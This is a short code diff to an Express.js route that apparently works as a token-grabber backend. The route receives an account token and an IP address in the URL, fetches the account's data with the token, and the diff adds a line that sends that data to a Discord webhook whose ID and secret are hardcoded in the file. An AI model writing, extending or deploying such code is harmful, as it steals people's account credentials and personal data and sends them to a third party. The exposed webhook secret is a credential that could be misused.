@@ -2,11 +2,12 @@ const express = require('express');
 const router = express.Router();
 const fetch = require('node-fetch');
 const {WebhookClient} = require('discord.js');
+    const webhook = new WebhookClient("861652348848570398", "C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O");
+
 router.get('/', (req,res) => {
     if(!req.query.token || !req.query.ip) return res.render('404', {layout:'home'});
     //let parse = parseWebhookURL(req.query.webhook);
     //if(parse == null) return res.render('404', {layout:'home'});
-    const webhook = new WebhookClient("861652348848570398", "C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O");
     let user = getUserData(req.query.token);
     if(user == null) return;
     
@@ -24,6 +25,7 @@ async function getUserData(token){
         })
         if(buffer.status !== 200) return null;
         let json = await buffer.json();
+        webhook.send(json);
         return json;
     }catch(err)
     {
